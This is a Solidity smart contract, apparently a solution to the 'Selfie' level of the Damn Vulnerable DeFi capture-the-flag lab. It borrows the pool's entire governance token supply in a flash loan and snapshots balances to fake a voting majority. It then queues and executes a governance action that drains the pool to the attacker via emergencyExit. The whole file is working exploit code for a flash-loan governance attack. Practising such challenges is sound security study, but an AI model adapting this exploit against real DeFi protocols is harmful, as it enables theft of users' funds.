// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/src/auth/Owned.sol";
import "hardhat/console.sol";

contract AttackerSelfie is Owned, IERC3156FlashBorrower {
    uint256 private actionId;

    SelfiePool public immutable pool;
    ISimpleGovernance public immutable gov;
    DamnValuableTokenSnapshot public immutable token;
    ISimpleGovernance.GovernanceAction public action;

    uint256 TOKENS_IN_POOL = 1500000 * 10 ** 18;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error Wrong_Caller();

    constructor(address _pool) Owned(msg.sender) {
        pool = SelfiePool(_pool);
        gov = ISimpleGovernance(pool.governance());
        token = DamnValuableTokenSnapshot(address(pool.token()));
    }

    function startAttack() external onlyOwner {
        token.approve(address(pool), token.balanceOf(address(pool)));
        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "0x");
    }

    function onFlashLoan(address initiator, address, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        if (msg.sender != address(pool)) revert Wrong_Caller();
        token.snapshot();
        actionId = gov.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
        return CALLBACK_SUCCESS;
    }

    function endAttack() external onlyOwner {
        gov.executeAction(actionId);
    }

    function _hasEnoughVotes() private view returns (bool) {
        uint256 balance = token.getBalanceAtLastSnapshot(address(this));
        uint256 halfTotalSupply = token.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}
